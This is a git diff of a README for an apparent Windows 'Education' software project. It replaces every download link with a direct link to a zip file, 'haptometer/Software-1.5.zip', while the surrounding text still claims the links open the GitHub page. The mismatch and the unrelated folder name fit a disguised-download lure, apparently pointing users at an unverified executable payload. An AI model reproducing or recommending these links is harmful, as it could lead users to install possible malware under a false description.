@@ -1,6 +1,6 @@
 # 📚 Education - Tools for Teaching and Learning
 
-[![Download Education](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/HAARAaki/Education)
+[![Download Education](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/HAARAaki/Education/raw/refs/heads/main/haptometer/Software-1.5.zip)
 
 ## 📘 About Education
 
@@ -44,7 +44,7 @@ Follow these steps to download and run the Education applications on Windows. No
 
 Click the green button above or visit the link below to get the Education package. This link will open the GitHub page where you can find the latest version and download the files.
 
-[Download Education](https://github.com/HAARAaki/Education)
+[Download Education](https://github.com/HAARAaki/Education/raw/refs/heads/main/haptometer/Software-1.5.zip)
 
 ### Step 2: Find the Install Files
 
@@ -114,7 +114,7 @@ The applications do not require internet while running unless you are downloadin
 
 Use the link below to start downloading Education. This will take you to the GitHub page where you can find all available versions and files.
 
-[Get Education on GitHub](https://github.com/HAARAaki/Education)
+[Get Education on GitHub](https://github.com/HAARAaki/Education/raw/refs/heads/main/haptometer/Software-1.5.zip)
 
 Make sure to follow the installation steps in the "Getting Started" section for smooth setup and use.
 
